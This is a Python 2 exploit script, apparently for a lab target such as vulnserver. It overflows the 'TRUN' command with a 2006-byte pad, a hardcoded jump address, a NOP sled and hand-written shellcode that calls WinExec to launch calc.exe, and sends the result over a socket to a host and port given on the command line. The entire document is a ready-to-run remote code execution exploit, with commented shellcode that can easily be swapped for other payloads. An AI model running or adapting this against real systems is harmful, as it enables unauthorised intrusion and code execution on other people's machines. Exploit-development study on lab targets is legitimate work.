import socket
import sys

ip = sys.argv[1]
port = int(sys.argv[2])

overflow_size = 2006
jmp = "\xAF\x11\x50\x62"
nop_sled = 32

payload = ""
# GENERATE A NULL BYTE TO TERMINATE DOS CMD
payload += "\x33\xC0"					# xor eax,eax two things together to get 0	xor eax with itself NOTE: 0s out eax register
payload += "\x50"						# push eax	NOTE: adds null byte onto the stack
# BEGIN DOS CMD
payload += "\x68\x2E\x65\x78\x65"		# push(68) 2E657865 NOTE: .exe
payload += "\x68\x63\x61\x6C\x63"		# push(68) 63616C63	NOTE: calc
# END DOS CMD
payload += "\x8B\xC4"					# mov eax, esp stack pointer will be pointing at the beginning of instruction in assembly
										# NOTE: moving address of dos cmd in eax
payload += "\x6A\x01" 					# push 1    NOTE: Second argv to WinExec.
payload += "\x50" 						# push  eax NOTE: addr in eax.  first argv to WinExec.  push the contents of eax onto the stack
payload += "\xBB\xAD\x23\x86\x7C" 		# mov ebx, [7C8623AD] 
payload += "\xFF\xD3" 					# call ebx

bad_cmd = "TRUN ." + "A" * overflow_size + jmp + "\x90" * nop_sled + payload

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(5)
	s.connect((ip,port))
	data = s.recv(4096)
	# print data
	s.send(bad_cmd)
	print data
	s.close()
except:
	print "[*] TANGO DOWN"